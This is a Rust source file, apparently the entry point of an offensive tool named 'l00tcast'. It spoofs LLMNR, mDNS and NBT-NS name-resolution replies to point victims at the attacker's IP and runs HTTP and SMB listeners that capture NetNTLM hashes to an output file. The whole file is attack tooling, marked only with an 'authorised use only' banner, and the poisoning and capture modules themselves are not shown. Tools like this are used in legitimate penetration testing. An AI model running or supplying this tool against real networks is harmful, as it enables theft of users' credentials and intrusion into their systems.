




use l00tcast::{http_capture, poison, smb};
use anyhow::Result;
use clap::Parser;
use std::net::Ipv4Addr;

/// l00tcast — LLMNR/NBT-NS/mDNS poisoning + NetNTLM capture (authorised use only).
#[derive(Parser)]
#[command(name = "l00tcast", version, about)]
struct Cli {
    /// Attacker IPv4 handed out in responses (e.g. your LAN IP).
    #[arg(short = 'I', long)]
    interface_ip: Ipv4Addr,

    #[arg(long)]
    llmnr: bool,
    #[arg(long)]
    nbtns: bool,
    #[arg(long)]
    mdns: bool,
    #[arg(long)]
    http: bool,
    #[arg(long)]
    smb: bool,

    /// Port of the HTTP capture listener.
    #[arg(long, default_value_t = 80)]
    http_port: u16,

    /// Port of the SMB capture listener.
    #[arg(long, default_value_t = 445)]
    smb_port: u16,

    /// File to append captured hashes to.
    #[arg(short, long)]
    output: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let c = Cli::parse();
    let all = !(c.llmnr || c.nbtns || c.mdns || c.http || c.smb);
    let ip = c.interface_ip;

    eprintln!("[*] l00tcast — authorised use only. Handing out IP: {ip}");
    let mut tasks = Vec::new();

    if all || c.llmnr {
        tasks.push(tokio::spawn(async move {
            poison::run_dns_poison("LLMNR", 5355, Ipv4Addr::new(224, 0, 0, 252), ip).await
        }));
    }
    if all || c.mdns {
        tasks.push(tokio::spawn(async move {
            poison::run_dns_poison("mDNS", 5353, Ipv4Addr::new(224, 0, 0, 251), ip).await
        }));
    }
    if all || c.nbtns {
        tasks.push(tokio::spawn(async move { poison::run_nbtns(ip).await }));
    }
    if all || c.http {
        let port = c.http_port;
        let out = c.output.clone();
        tasks.push(tokio::spawn(async move { http_capture::run(port, out).await }));
    }
    if all || c.smb {
        let port = c.smb_port;
        let out = c.output.clone();
        tasks.push(tokio::spawn(async move { smb::run(port, out).await }));
    }

    for t in tasks {
        if let Ok(Err(e)) = t.await {
            eprintln!("[!] listener stopped: {e}");
        }
    }
    Ok(())
}
